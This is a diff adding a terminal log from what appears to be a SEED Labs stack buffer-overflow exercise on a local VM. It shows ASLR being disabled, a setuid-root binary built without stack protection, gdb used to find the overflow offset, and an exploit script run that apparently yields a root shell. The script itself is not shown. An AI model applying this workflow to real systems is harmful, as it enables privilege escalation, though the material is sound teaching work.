@@ -1,0 +1,89 @@
+[09/24/23]seed@VM:~$ cd Documents/
+[09/24/23]seed@VM:~/Documents$ sudo sysctl -w kernel.randomize_va_space=0
+kernel.randomize_va_space = 0
+[09/24/23]seed@VM:~/Documents$ gcc -o stack -z execstack -fno-stack-protector stack.c
+[09/24/23]seed@VM:~/Documents$ sudo chown root stack
+[09/24/23]seed@VM:~/Documents$ sudo chmod 4755 stack
+[09/24/23]seed@VM:~/Documents$ echo "aa" > badfile
+[09/24/23]seed@VM:~/Documents$ ./stack
+Returned Properly
+[09/24/23]seed@VM:~/Documents$ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > badfile
+[09/24/23]seed@VM:~/Documents$ ./stack
+Segmentation fault
+[09/24/23]seed@VM:~/Documents$ gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c
+[09/24/23]seed@VM:~/Documents$ touch badfile
+[09/24/23]seed@VM:~/Documents$ gdb stack_dbg
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from stack_dbg...done.
+gdb-peda$ b bof
+Breakpoint 1 at 0x80484f1: file stack.c, line 21.
+gdb-peda$ run
+Starting program: /home/seed/Documents/stack_dbg 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xbfffeac7 ('a' <repeats 200 times>...)
+EBX: 0x0 
+ECX: 0x804fb20 --> 0x0 
+EDX: 0x0 
+ESI: 0xb7f1c000 --> 0x1b1db0 
+EDI: 0xb7f1c000 --> 0x1b1db0 
+EBP: 0xbfffea88 --> 0xbfffecd8 --> 0x0 
+ESP: 0xbfffea60 --> 0xb7fe96eb (<_dl_fixup+11>:	add    esi,0x15915)
+EIP: 0x80484f1 (<bof+6>:	sub    esp,0x8)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80484eb <bof>:	push   ebp
+   0x80484ec <bof+1>:	mov    ebp,esp
+   0x80484ee <bof+3>:	sub    esp,0x28
+=> 0x80484f1 <bof+6>:	sub    esp,0x8
+   0x80484f4 <bof+9>:	push   DWORD PTR [ebp+0x8]
+   0x80484f7 <bof+12>:	lea    eax,[ebp-0x20]
+   0x80484fa <bof+15>:	push   eax
+   0x80484fb <bof+16>:	call   0x8048390 <strcpy@plt>
+[------------------------------------stack-------------------------------------]
+0000| 0xbfffea60 --> 0xb7fe96eb (<_dl_fixup+11>:	add    esi,0x15915)
+0004| 0xbfffea64 --> 0x0 
+0008| 0xbfffea68 --> 0xb7f1c000 --> 0x1b1db0 
+0012| 0xbfffea6c --> 0xb7b62940 (0xb7b62940)
+0016| 0xbfffea70 --> 0xbfffecd8 --> 0x0 
+0020| 0xbfffea74 --> 0xb7feff10 (<_dl_runtime_resolve+16>:	pop    edx)
+0024| 0xbfffea78 --> 0xb7dc888b (<__GI__IO_fread+11>:	add    ebx,0x153775)
+0028| 0xbfffea7c --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, bof (str=0xbfffeac7 'a' <repeats 200 times>...) at stack.c:21
+21	    strcpy(buffer, str);       
+gdb-peda$ p $ebp
+$1 = (void *) 0xbfffea88
+gdb-peda$ p &buffer
+$2 = (char (*)[24]) 0xbfffea68
+gdb-peda$ p/d 0xbfffea88-0xbfffea68
+$3 = 32
+gdb-peda$ quit
+[09/24/23]seed@VM:~/Documents$ chmod u+x exploit.py
+[09/24/23]seed@VM:~/Documents$ rm badfile
+[09/24/23]seed@VM:~/Documents$ exploit.py
+[09/24/23]seed@VM:~/Documents$ ./stack
+Segmentation fault
+[09/24/23]seed@VM:~/Documents$ chmod u+x exploit.py
+[09/24/23]seed@VM:~/Documents$ rm badfile
+[09/24/23]seed@VM:~/Documents$ exploit.py
+[09/24/23]seed@VM:~/Documents$ ./stack
+#                                                                              
+#
